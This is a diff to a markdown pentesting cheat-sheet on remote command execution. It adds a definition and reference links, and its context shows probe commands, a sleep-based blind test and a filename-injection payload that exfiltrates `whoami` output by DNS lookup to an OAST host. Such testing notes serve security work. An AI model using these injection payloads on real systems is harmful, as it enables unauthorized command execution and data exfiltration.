@@ -1,6 +1,8 @@
-# Remote Command Execution
+# Remote Code/Command Execution (RCE)
 
-## Non-destructive commands
+RCE vulnerabilities allow an attacker to execute arbitrary commands or code on a target system. These can arise from command injection, deserialization flaws, file upload vulnerabilities, SSTI, and more.
+
+## Non-Destructive Commands
 
 - pwd
 - uname
@@ -65,7 +67,6 @@ if [ "a" = "a" ]; then sleep 10; fi
 
 > [!tip]
 > On `sh` use one `=`, on `bash` use two `==`.
-> 
 
 Get the value one character at a time
 
@@ -85,4 +86,9 @@ Understand what the app is doing with the file. If it's moving or renaming, we c
 `nslookup $(whoami).OAST.FUN`.pdf
 ```
 
+---
 
+## References
+
+- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+- [HackTricks - RCE](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
